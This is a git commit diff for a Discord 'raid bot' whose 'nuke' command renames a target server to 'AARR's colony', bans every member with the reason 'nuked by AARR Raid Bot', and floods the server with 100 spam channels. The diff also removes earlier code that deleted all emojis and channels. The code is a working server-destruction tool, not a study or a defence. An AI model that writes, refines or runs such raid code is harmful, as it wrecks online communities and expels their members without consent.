e9fb2812562fc3aacb698fe6589ebdfa378ab52d
zearakun <91083604+zearakun@users.noreply.github.com>
2022-06-19 23:57:13 +0900

    Update main.py

--- main.py
+++ main.py
@@ -14,24 +14,14 @@ client = commands.Bot(command_prefix="n!",intents=intents)
 
 @client.command()
 async def nuke(ctx,guild: discord.Guild):
-  for emoji in guild.emojis:
-    try:
-      await emoji.delete()
-    except:
-      return
-  for channel in guild.channels:
-    try:
-      await channel.delete()
-    except:
-      return
   await guild.edit(name="AARRの植民地")
-  for createchannel in range(100):
-      await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
   for user in guild.members:
     try:
       await user.ban(reason="nuked by AARR Raid Bot")
     except:
       return
+  for createchannel in range(100):
+      await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
   await ctx.reply(f"raid完了!")
 
 
